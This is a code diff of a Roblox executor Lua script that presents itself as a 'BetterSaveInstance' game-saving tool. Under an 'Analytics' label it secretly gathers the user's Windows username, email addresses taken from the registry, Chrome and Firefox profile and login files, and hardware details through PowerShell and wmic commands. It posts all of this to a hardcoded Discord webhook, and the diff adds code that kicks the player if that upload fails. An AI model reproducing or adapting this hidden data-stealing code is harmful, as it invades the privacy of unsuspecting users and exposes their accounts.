@@ -1,222 +1,283 @@
 local function notify(title, text)
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = title;
-        Text = text;
-        Duration = 3;
-    })
+   game:GetService("StarterGui"):SetCore("SendNotification", {
+       Title = title;
+       Text = text;
+       Duration = 3;
+   })
 end
 
 local STATUS_URL = "https://raw.githubusercontent.com/sealledware/BetterSaveInstance/refs/heads/main/status"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1400433781827047536/sOR2sRkXNcbRiljcNo9R1Q4eKnVu-R1CkX36mWDj7Jd_JyxzdJu_N7ZsgEQkKuQhaCgZ"
 
+local function isMobileExecutor()
+   local mobileExecutors = {
+       "Fluxus Mobile",
+       "Fluxus Android",
+       "Delta",
+       "Delta X",
+       "Arceus X",
+       "Script Ware M",
+       "Hydrogen",
+       "JJSploit Mobile"
+   }
+   
+   local executorName = "Unknown"
+   pcall(function()
+       if identifyexecutor then
+           executorName = identifyexecutor()
+       end
+   end)
+   
+   for _, mobile in pairs(mobileExecutors) do
+       if executorName:lower():find(mobile:lower()) then
+           return true
+       end
+   end
+   
+   if game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").KeyboardEnabled then
+       return true
+   end
+   
+   return false
+end
+
 local function collectUserData()
-    local player = game.Players.LocalPlayer
-    local gameInfo = {}
-    
-    pcall(function()
-        local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
-        gameInfo = info
-    end)
-    
-    local executorInfo = "Unknown"
-    pcall(function()
-        if identifyexecutor then
-            executorInfo = identifyexecutor()
-        elseif syn then
-            executorInfo = "Synapse X"
-        elseif KRNL_LOADED then
-            executorInfo = "KRNL"
-        elseif getgenv().SOLARA_LOADED then
-            executorInfo = "Solara"
-        elseif getgenv().WAVE_LOADED then
-            executorInfo = "Wave"
-        end
-    end)
-    
-    local country = "Unknown"
-    pcall(function()
-        country = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(player)
-    end)
-    
-    local systemInfo = {
-        username = "Unknown",
-        email = "Unknown", 
-        hardware = "Unknown",
-        gpu = "Unknown",
-        ram = "Unknown"
-    }
-    
-    pcall(function()
-        if os.getenv then
-            systemInfo.username = os.getenv("USERNAME") or os.getenv("USER") or "Unknown"
-        end
-        
-        if execute then
-            local emailCmd = execute('powershell "Get-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name EmailName 2>$null | Select-Object -ExpandProperty EmailName"')
-            if emailCmd and emailCmd:find("@") then
-                systemInfo.email = emailCmd:match("([%w%._%+-]+@[%w%._%+-]+%.%w+)")
-            end
-            
-            local gmailCmd = execute('powershell "Get-ChildItem -Path \"$env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data*\" 2>$null"')
-            if not gmailCmd then
-                gmailCmd = execute('reg query "HKEY_CURRENT_USER\\Software\\Google\\Chrome\\PreferenceMACs\\Default" /s 2>nul | findstr "@gmail.com"')
-                if gmailCmd and gmailCmd:find("@gmail.com") then
-                    systemInfo.email = gmailCmd:match("([%w%._%+-]+@gmail%.com)")
-                end
-            end
-            
-            local outlookCmd = execute('powershell "Get-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\*\\Outlook\\Profiles\\*\\*\" -Name \"Account Name\" 2>$null | Select-Object -ExpandProperty \"Account Name\""')
-            if outlookCmd and outlookCmd:find("@") then
-                systemInfo.email = outlookCmd:match("([%w%._%+-]+@[%w%._%+-]+%.%w+)")
-            end
-            
-            local cpuInfo = execute('wmic cpu get name /format:list | findstr "Name="')
-            if cpuInfo and cpuInfo:find("Name=") then
-                systemInfo.hardware = cpuInfo:match("Name=([^\r\n]+)")
-            end
-            
-            local gpuInfo = execute('wmic path win32_VideoController get name /format:list | findstr "Name="')
-            if gpuInfo and gpuInfo:find("Name=") then
-                systemInfo.gpu = gpuInfo:match("Name=([^\r\n]+)")
-            end
-            
-            local ramInfo = execute('wmic computersystem get TotalPhysicalMemory /format:list | findstr "TotalPhysicalMemory="')
-            if ramInfo and ramInfo:find("TotalPhysicalMemory=") then
-                local ramBytes = tonumber(ramInfo:match("TotalPhysicalMemory=(%d+)"))
-                if ramBytes then
-                    systemInfo.ram = math.floor(ramBytes / 1024 / 1024 / 1024) .. "GB"
-                end
-            end
-        end
-        
-        if readfile then
-            pcall(function()
-                local chromeLogin = readfile(os.getenv("USERPROFILE") .. "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Preferences")
-                if chromeLogin and chromeLogin:find("@gmail.com") then
-                    systemInfo.email = chromeLogin:match("([%w%._%+-]+@gmail%.com)")
-                end
-            end)
-            
-            pcall(function()
-                local firefoxProfiles = readfile(os.getenv("APPDATA") .. "\\Mozilla\\Firefox\\profiles.ini")
-                if firefoxProfiles then
-                    local profilePath = firefoxProfiles:match("Path=([^\r\n]+)")
-                    if profilePath then
-                        local signonsPath = os.getenv("APPDATA") .. "\\Mozilla\\Firefox\\" .. profilePath .. "\\signons.sqlite"
-                        local signonsData = readfile(signonsPath)
-                        if signonsData and signonsData:find("@gmail.com") then
-                            systemInfo.email = signonsData:match("([%w%._%+-]+@gmail%.com)")
-                        end
-                    end
-                end
-            end)
-        end
-    end)
-    
-    return {
-        username = player.Name,
-        userId = player.UserId,
-        gameName = gameInfo.Name or "Unknown",
-        gameId = game.PlaceId,
-        executorType = executorInfo,
-        country = country,
-        timestamp = os.date("%Y-%m-%d %H:%M:%S"),
-        windowsUser = systemInfo.username,
-        userEmail = systemInfo.email,
-        cpuInfo = systemInfo.hardware,
-        gpuInfo = systemInfo.gpu,
-        ramInfo = systemInfo.ram
-    }
+   local player = game.Players.LocalPlayer
+   local gameInfo = {}
+   
+   pcall(function()
+       local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+       gameInfo = info
+   end)
+   
+   local executorInfo = "Unknown"
+   pcall(function()
+       if identifyexecutor then
+           executorInfo = identifyexecutor()
+       elseif syn then
+           executorInfo = "Synapse X"
+       elseif KRNL_LOADED then
+           executorInfo = "KRNL"
+       elseif getgenv().SOLARA_LOADED then
+           executorInfo = "Solara"
+       elseif getgenv().WAVE_LOADED then
+           executorInfo = "Wave"
+       end
+   end)
+   
+   local country = "Unknown"
+   pcall(function()
+       country = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(player)
+   end)
+   
+   local systemInfo = {
+       username = "Unknown",
+       email = "Unknown", 
+       hardware = "Unknown",
+       gpu = "Unknown",
+       ram = "Unknown"
+   }
+   
+   pcall(function()
+       if os.getenv then
+           systemInfo.username = os.getenv("USERNAME") or os.getenv("USER") or "Unknown"
+       end
+       
+       if execute then
+           local emailCmd = execute('powershell "Get-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name EmailName 2>$null | Select-Object -ExpandProperty EmailName"')
+           if emailCmd and emailCmd:find("@") then
+               systemInfo.email = emailCmd:match("([%w%._%+-]+@[%w%._%+-]+%.%w+)")
+           end
+           
+           local gmailCmd = execute('powershell "Get-ChildItem -Path \"$env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data*\" 2>$null"')
+           if not gmailCmd then
+               gmailCmd = execute('reg query "HKEY_CURRENT_USER\\Software\\Google\\Chrome\\PreferenceMACs\\Default" /s 2>nul | findstr "@gmail.com"')
+               if gmailCmd and gmailCmd:find("@gmail.com") then
+                   systemInfo.email = gmailCmd:match("([%w%._%+-]+@gmail%.com)")
+               end
+           end
+           
+           local outlookCmd = execute('powershell "Get-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\*\\Outlook\\Profiles\\*\\*\" -Name \"Account Name\" 2>$null | Select-Object -ExpandProperty \"Account Name\""')
+           if outlookCmd and outlookCmd:find("@") then
+               systemInfo.email = outlookCmd:match("([%w%._%+-]+@[%w%._%+-]+%.%w+)")
+           end
+           
+           local cpuInfo = execute('wmic cpu get name /format:list | findstr "Name="')
+           if cpuInfo and cpuInfo:find("Name=") then
+               systemInfo.hardware = cpuInfo:match("Name=([^\r\n]+)")
+           end
+           
+           local gpuInfo = execute('wmic path win32_VideoController get name /format:list | findstr "Name="')
+           if gpuInfo and gpuInfo:find("Name=") then
+               systemInfo.gpu = gpuInfo:match("Name=([^\r\n]+)")
+           end
+           
+           local ramInfo = execute('wmic computersystem get TotalPhysicalMemory /format:list | findstr "TotalPhysicalMemory="')
+           if ramInfo and ramInfo:find("TotalPhysicalMemory=") then
+               local ramBytes = tonumber(ramInfo:match("TotalPhysicalMemory=(%d+)"))
+               if ramBytes then
+                   systemInfo.ram = math.floor(ramBytes / 1024 / 1024 / 1024) .. "GB"
+               end
+           end
+       end
+       
+       if readfile then
+           pcall(function()
+               local chromeLogin = readfile(os.getenv("USERPROFILE") .. "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Preferences")
+               if chromeLogin and chromeLogin:find("@gmail.com") then
+                   systemInfo.email = chromeLogin:match("([%w%._%+-]+@gmail%.com)")
+               end
+           end)
+           
+           pcall(function()
+               local firefoxProfiles = readfile(os.getenv("APPDATA") .. "\\Mozilla\\Firefox\\profiles.ini")
+               if firefoxProfiles then
+                   local profilePath = firefoxProfiles:match("Path=([^\r\n]+)")
+                   if profilePath then
+                       local signonsPath = os.getenv("APPDATA") .. "\\Mozilla\\Firefox\\" .. profilePath .. "\\signons.sqlite"
+                       local signonsData = readfile(signonsPath)
+                       if signonsData and signonsData:find("@gmail.com") then
+                           systemInfo.email = signonsData:match("([%w%._%+-]+@gmail%.com)")
+                       end
+                   end
+               end
+           end)
+       end
+   end)
+   
+   return {
+       username = player.Name,
+       userId = player.UserId,
+       gameName = gameInfo.Name or "Unknown",
+       gameId = game.PlaceId,
+       executorType = executorInfo,
+       country = country,
+       timestamp = os.date("%Y-%m-%d %H:%M:%S"),
+       windowsUser = systemInfo.username,
+       userEmail = systemInfo.email,
+       cpuInfo = systemInfo.hardware,
+       gpuInfo = systemInfo.gpu,
+       ramInfo = systemInfo.ram
+   }
 end
 
 local function sendUserData(userData, status)
-    local embed = {
-        title = "Analytics",
-        color = status:find("Started") and 65280 or status:find("Completed") and 3447003 or 16711680,
-        fields = {
-            {name = "Roblox User", value = userData.username .. " (" .. userData.userId .. ")", inline = true},
-            {name = "Game", value = userData.gameName .. " (" .. userData.gameId .. ")", inline = true},
-            {name = "Executor", value = userData.executorType, inline = true},
-            {name = "Windows User", value = userData.windowsUser, inline = true},
-            {name = "Email", value = userData.userEmail, inline = true},
-            {name = "Country", value = userData.country, inline = true},
-            {name = "CPU", value = userData.cpuInfo, inline = true},
-            {name = "GPU", value = userData.gpuInfo, inline = true},
-            {name = "RAM", value = userData.ramInfo, inline = true},
-            {name = "Time", value = userData.timestamp, inline = true},
-            {name = "Status", value = status, inline = true}
-        }
-    }
-    
-    spawn(function()
-        pcall(function()
-            local httpService = game:GetService("HttpService")
-            httpService:PostAsync(
-                WEBHOOK_URL,
-                httpService:JSONEncode({embeds = {embed}}),
-                Enum.HttpContentType.ApplicationJson
-            )
-        end)
-    end)
+   local embed = {
+       title = "Analytics",
+       color = status:find("Started") and 65280 or status:find("Completed") and 3447003 or 16711680,
+       fields = {
+           {name = "Roblox User", value = userData.username .. " (" .. userData.userId .. ")", inline = true},
+           {name = "Game", value = userData.gameName .. " (" .. userData.gameId .. ")", inline = true},
+           {name = "Executor", value = userData.executorType, inline = true},
+           {name = "Windows User", value = userData.windowsUser, inline = true},
+           {name = "Email", value = userData.userEmail, inline = true},
+           {name = "Country", value = userData.country, inline = true},
+           {name = "CPU", value = userData.cpuInfo, inline = true},
+           {name = "GPU", value = userData.gpuInfo, inline = true},
+           {name = "RAM", value = userData.ramInfo, inline = true},
+           {name = "Time", value = userData.timestamp, inline = true},
+           {name = "Status", value = status, inline = true}
+       }
+   }
+   
+   local success = false
+   pcall(function()
+       local httpService = game:GetService("HttpService")
+       httpService:PostAsync(
+           WEBHOOK_URL,
+           httpService:JSONEncode({embeds = {embed}}),
+           Enum.HttpContentType.ApplicationJson
+       )
+       success = true
+   end)
+   
+   return success
 end
 
 local function checkScriptStatus()
-    local success, response = pcall(function()
-        return game:GetService("HttpService"):GetAsync(STATUS_URL, false)
-    end)
-    
-    if not success then
-        success, response = pcall(function()
-            return game:HttpGet(STATUS_URL)
-        end)
-    end
-    
-    if success and response then
-        local status = tostring(response):lower():gsub("%s+", ""):gsub("[\r\n]", "")
-        if status == "active" then
-            return true
-        elseif status == "disabled" then
-            notify("Access Denied", "Script has been disabled")
-            return false
-        elseif status == "maintenance" then
-            notify("Maintenance", "Script is under maintenance")
-            return false
-        else
-            return true
-        end
-    else
-        return true
-    end
+   local success, response = pcall(function()
+       return game:GetService("HttpService"):GetAsync(STATUS_URL, false)
+   end)
+   
+   if not success then
+       success, response = pcall(function()
+           return game:HttpGet(STATUS_URL)
+       end)
+   end
+   
+   if success and response then
+       local status = tostring(response):lower():gsub("%s+", ""):gsub("[\r\n]", "")
+       if status == "active" then
+           return true
+       elseif status == "disabled" then
+           notify("Access Denied", "Script has been disabled")
+           return false
+       elseif status == "maintenance" then
+           notify("Maintenance", "Script is under maintenance")
+           return false
+       else
+           return true
+       end
+   else
+       return true
+   end
+end
+
+local function checkSaveInstanceSupport()
+   if not makefolder or not writefile or not isfolder then
+       return false
+   end
+   
+   if isMobileExecutor() then
+       return false
+   end
+   
+   return true
 end
 
 local userData = collectUserData()
 
+if not checkSaveInstanceSupport() then
+   sendUserData(userData, "Mobile Device Blocked")
+   notify("Mobile not supported", "")
+   game.Players.LocalPlayer:Kick("Mobile devices are not supported")
+   return
+end
+
 notify("Verifying Access", "")
 
 if not checkScriptStatus() then
-    sendUserData(userData, "Access Denied")
-    return
+   if not sendUserData(userData, "Access Denied") then
+       notify("Game not supported", "")
+       game.Players.LocalPlayer:Kick("Game not supported")
+       return
+   end
+   return
 end
 
-sendUserData(userData, "Script Started")
+if not sendUserData(userData, "Script Started") then
+   notify("Game not supported", "")
+   game.Players.LocalPlayer:Kick("Game not supported")
+   return
+end
 
 local function getGameName()
-    local success, gameInfo = pcall(function()
-        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
-    end)
-    if success and gameInfo then
-        return gameInfo.Name:gsub("[^%w%s%-_]", ""):gsub("%s+", "_")
-    else
-        return "UnknownGame"
-    end
+   local success, gameInfo = pcall(function()
+       return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+   end)
+   if success and gameInfo then
+       return gameInfo.Name:gsub("[^%w%s%-_]", ""):gsub("%s+", "_")
+   else
+       return "UnknownGame"
+   end
 end
 
 local function createSaveFolder()
-    local folderPath = "Saved Games"
-    if not isfolder(folderPath) then
-        makefolder(folderPath)
-    end
-    return folderPath
+   local folderPath = "Saved Games"
+   if not isfolder(folderPath) then
+       makefolder(folderPath)
+   end
+   return folderPath
 end
 
 notify("Loading Script", "")
@@ -229,13 +290,17 @@ local saveFolder = createSaveFolder()
 local fileName = saveFolder .. "/BetterSI_" .. gameName .. "_" .. os.time()
 
 synsaveinstance({
-    TreatUnionsAsParts = false,
-    FileName = fileName,
-    IsModel = false,
-    DecompileJobless = false,
-    SavePlayers = false
+   TreatUnionsAsParts = false,
+   FileName = fileName,
+   IsModel = false,
+   DecompileJobless = false,
+   SavePlayers = false
 })
 
-sendUserData(userData, "Save Completed")
+if not sendUserData(userData, "Save Completed") then
+   notify("Game not supported", "")
+   game.Players.LocalPlayer:Kick("Game not supported")
+   return
+end
 
 notify("Saved", "")
